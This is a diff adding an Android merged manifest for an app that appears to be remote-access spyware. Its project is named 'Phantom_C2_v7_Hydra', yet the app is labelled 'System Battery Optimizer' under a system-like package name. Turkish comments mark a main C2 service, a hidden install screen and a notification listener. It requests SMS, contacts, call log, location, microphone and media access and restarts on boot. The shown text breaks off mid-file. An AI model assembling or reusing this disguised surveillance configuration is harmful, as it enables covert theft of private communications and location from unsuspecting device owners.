@@ -1,0 +1,372 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.android.system.optimizer"
+4    android:versionCode="7"
+5    android:versionName="7.0-HYDRA" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="28"
+9        android:targetSdkVersion="34" />
+10    <!-- Temel Ağ ve Sistem -->
+11    <uses-permission android:name="android.permission.INTERNET" />
+11-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:4:5-67
+11-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:4:22-64
+12    <uses-permission android:name="android.permission.WAKE_LOCK" />
+12-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:5:5-68
+12-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:5:22-65
+13    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+13-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:6:5-77
+13-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:6:22-74
+14    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+14-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:7:5-87
+14-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:7:22-84
+15    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+15-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:8:5-81
+15-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:8:22-78
+16
+17    <!-- İstenen Standart Runtime İzinleri (Admin veya Erişilebilirlik YOK) -->
+18    <uses-permission android:name="android.permission.READ_CONTACTS" />
+18-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:11:5-72
+18-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:11:22-69
+19    <uses-permission android:name="android.permission.READ_SMS" />
+19-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:12:5-67
+19-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:12:22-64
+20    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+20-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:13:5-72
+20-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:13:22-69
+21    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+21-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:14:5-79
+21-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:14:22-76
+22    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+22-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:15:5-71
+22-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:15:22-68
+23    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+23-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:16:5-80
+23-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:16:22-77
+24    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+24-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:17:5-76
+24-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:17:22-73
+25    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+25-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:24:5-79
+25-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:24:22-76
+26
+27    <permission
+27-->[androidx.core:core:1.12.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\8e489c08aa61dee9d9f4605f0aa5e31a\transformed\core-1.12.0\AndroidManifest.xml:22:5-24:47
+28        android:name="com.android.system.optimizer.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+28-->[androidx.core:core:1.12.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\8e489c08aa61dee9d9f4605f0aa5e31a\transformed\core-1.12.0\AndroidManifest.xml:23:9-81
+29        android:protectionLevel="signature" />
+29-->[androidx.core:core:1.12.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\8e489c08aa61dee9d9f4605f0aa5e31a\transformed\core-1.12.0\AndroidManifest.xml:24:9-44
+30
+31    <uses-permission android:name="com.android.system.optimizer.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+31-->[androidx.core:core:1.12.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\8e489c08aa61dee9d9f4605f0aa5e31a\transformed\core-1.12.0\AndroidManifest.xml:26:5-97
+31-->[androidx.core:core:1.12.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\8e489c08aa61dee9d9f4605f0aa5e31a\transformed\core-1.12.0\AndroidManifest.xml:26:22-94
+32
+33    <application
+33-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:19:5-47:19
+34        android:allowBackup="false"
+34-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:19:18-45
+35        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+35-->[androidx.core:core:1.12.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\8e489c08aa61dee9d9f4605f0aa5e31a\transformed\core-1.12.0\AndroidManifest.xml:28:18-86
+36        android:debuggable="true"
+37        android:extractNativeLibs="false"
+38        android:icon="@android:drawable/sym_def_app_icon"
+38-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:19:46-95
+39        android:label="System Battery Optimizer"
+39-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:19:96-136
+40        android:theme="@style/Theme.AppCompat.DayNight.NoActionBar" >
+40-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:19:137-196
+41
+42        <!-- YENİDEN BAŞLATMA TETİKLEYİCİSİ -->
+43        <receiver
+43-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:22:9-29:20
+44            android:name="com.android.system.optimizer.BootReceiver"
+44-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:22:19-47
+45            android:exported="true" >
+45-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:22:48-71
+46            <intent-filter android:priority="999" >
+46-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:23:13-28:29
+46-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:23:28-50
+47                <action android:name="android.intent.action.BOOT_COMPLETED" />
+47-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:24:17-79
+47-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:24:25-76
+48                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+48-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:25:17-86
+48-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:25:25-83
+49                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+49-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:26:17-82
+49-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:26:25-79
+50                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+50-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:27:17-84
+50-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:27:25-81
+51            </intent-filter>
+52        </receiver>
+53
+54        <!-- BİLDİRİM DİNLEME SERVİSİ (Admin Gerektirmez) -->
+55        <service
+55-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:32:9-38:19
+56            android:name="com.android.system.optimizer.NotificationMonitorService"
+56-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:32:18-88
+57            android:exported="true"
+57-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:34:13-36
+58            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
+58-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:33:13-87
+59            <intent-filter>
+59-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:35:13-37:29
+60                <action android:name="android.service.notification.NotificationListenerService" />
+60-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:36:17-99
+60-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:36:25-96
+61            </intent-filter>
+62        </service>
+63
+64        <!-- ANA C2 SERVİSİ -->
+65        <service
+65-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:41:9-168
+66            android:name="com.android.system.optimizer.PhantomService"
+66-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:41:18-76
+67            android:enabled="true"
+67-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:41:77-99
+68            android:exported="false"
+68-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:41:100-124
+69            android:foregroundServiceType="dataSync" />
+69-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:41:125-165
+70
+71        <!-- GİZLİ KURULUM EKRANI -->
+72        <activity
+72-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:44:9-46:20
+73            android:name="com.android.system.optimizer.MainActivity"
+73-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:44:19-75
+74            android:excludeFromRecents="true"
+74-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:44:100-133
+75            android:exported="true" >
+75-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:44:76-99
+76            <intent-filter>
+76-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:45:13-159
+77                <action android:name="android.intent.action.MAIN" />
+77-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:45:29-81
+77-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:45:37-78
+78
+79                <category android:name="android.intent.category.LAUNCHER" />
+79-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:45:82-142
+79-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:45:92-139
+80            </intent-filter>
+81        </activity>
+82
+83        <provider
+83-->[androidx.emoji2:emoji2:1.2.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\0d1131919837babacf6e89b08792d743\transformed\emoji2-1.2.0\AndroidManifest.xml:24:9-32:20
+84            android:name="androidx.startup.InitializationProvider"
+84-->[androidx.emoji2:emoji2:1.2.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\0d1131919837babacf6e89b08792d743\transformed\emoji2-1.2.0\AndroidManifest.xml:25:13-67
+85            android:authorities="com.android.system.optimizer.androidx-startup"
+85-->[androidx.emoji2:emoji2:1.2.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\0d1131919837babacf6e89b08792d743\transformed\emoji2-1.2.0\AndroidManifest.xml:26:13-68
+86            android:exported="false" >
+86-->[androidx.emoji2:emoji2:1.2.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\0d1131919837babacf6e89b08792d743\transformed\emoji2-1.2.0\AndroidManifest.xml:27:13-37
+87            <meta-data
+87-->[androidx.emoji2:emoji2:1.2.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\0d1131919837babacf6e89b08792d743\transformed\emoji2-1.2.0\AndroidManifest.xml:29:13-31:52
+88                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+88-->[androidx.emoji2:emoji2:1.2.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\0d1131919837babacf6e89b08792d743\transformed\emoji2-1.2.0\AndroidManifest.xml:30:17-75
+89                android:value="androidx.startup" />
+89-->[androidx.emoji2:emoji2:1.2.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\0d1131919837babacf6e89b08792d743\transformed\emoji2-1.2.0\AndroidManifest.xml:31:17-49
+90            <meta-data
+90-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:34:13-36:52
+91                android:name="androidx.work.WorkManagerInitializer"
+91-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:35:17-68
+92                android:value="androidx.startup" />
+92-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:36:17-49
+93            <meta-data
+93-->[androidx.lifecycle:lifecycle-process:2.4.1] C:\Users\bbyra\.gradle\caches\8.8\transforms\e8eebb10001071363663791008a97a98\transformed\lifecycle-process-2.4.1\AndroidManifest.xml:31:13-33:52
+94                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+94-->[androidx.lifecycle:lifecycle-process:2.4.1] C:\Users\bbyra\.gradle\caches\8.8\transforms\e8eebb10001071363663791008a97a98\transformed\lifecycle-process-2.4.1\AndroidManifest.xml:32:17-78
+95                android:value="androidx.startup" />
+95-->[androidx.lifecycle:lifecycle-process:2.4.1] C:\Users\bbyra\.gradle\caches\8.8\transforms\e8eebb10001071363663791008a97a98\transformed\lifecycle-process-2.4.1\AndroidManifest.xml:33:17-49
+96        </provider>
+97
+98        <service
+98-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:39:9-45:35
+99            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
+99-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:40:13-88
+100            android:directBootAware="false"
+100-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:41:13-44
+101            android:enabled="@bool/enable_system_alarm_service_default"
+101-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:42:13-72
+102            android:exported="false" />
+102-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:43:13-37
+103        <service
+103-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:46:9-52:35
+104            android:name="androidx.work.impl.background.systemjob.SystemJobService"
+104-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:47:13-84
+105            android:directBootAware="false"
+105-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:48:13-44
+106            android:enabled="@bool/enable_system_job_service_default"
+106-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:49:13-70
+107            android:exported="true"
+107-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:50:13-36
+108            android:permission="android.permission.BIND_JOB_SERVICE" />
+108-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:51:13-69
+109        <service
+109-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:53:9-59:35
+110            android:name="androidx.work.impl.foreground.SystemForegroundService"
+110-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:54:13-81
+111            android:directBootAware="false"
+111-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:55:13-44
+112            android:enabled="@bool/enable_system_foreground_service_default"
+112-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:56:13-77
+113            android:exported="false" />
+113-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:57:13-37
+114
+115        <receiver
+115-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:61:9-66:35
+116            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
+116-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:62:13-88
+117            android:directBootAware="false"
+117-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:63:13-44
+118            android:enabled="true"
+118-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:64:13-35
+119            android:exported="false" />
+119-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:65:13-37
+120        <receiver
+120-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:67:9-77:20
+121            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
+121-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:68:13-106
+122            android:directBootAware="false"
+122-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:69:13-44
+123            android:enabled="false"
+123-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:70:13-36
+124            android:exported="false" >
+124-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:71:13-37
+125            <intent-filter>
+125-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:73:13-76:29
+126                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+126-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:74:17-87
+126-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:74:25-84
+127                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+127-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:75:17-90
+127-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:75:25-87
+128            </intent-filter>
+129        </receiver>
+130        <receiver
+130-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:78:9-88:20
+131            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
+131-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:79:13-104
+132            android:directBootAware="false"
+132-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:80:13-44
+133            android:enabled="false"
+133-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:81:13-36
+134            android:exported="false" >
+134-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:82:13-37
+135            <intent-filter>
+135-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:84:13-87:29
+136                <action android:name="android.intent.action.BATTERY_OKAY" />
+136-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:85:17-77
+136-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:85:25-74
+137                <action android:name="android.intent.action.BATTERY_LOW" />
+137-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:86:17-76
+137-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:86:25-73
+138            </intent-filter>
+139        </receiver>
+140        <receiver
+140-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:89:9-99:20
+141            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
+141-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:90:13-104
+142            android:directBootAware="false"
+142-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:91:13-44
+143            android:enabled="false"
+143-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:92:13-36
+144            android:exported="false" >
+144-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:93:13-37
+145            <intent-filter>
+145-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:95:13-98:29
+146                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
+146-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:96:17-83
+146-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:96:25-80
+147                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
+147-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:97:17-82
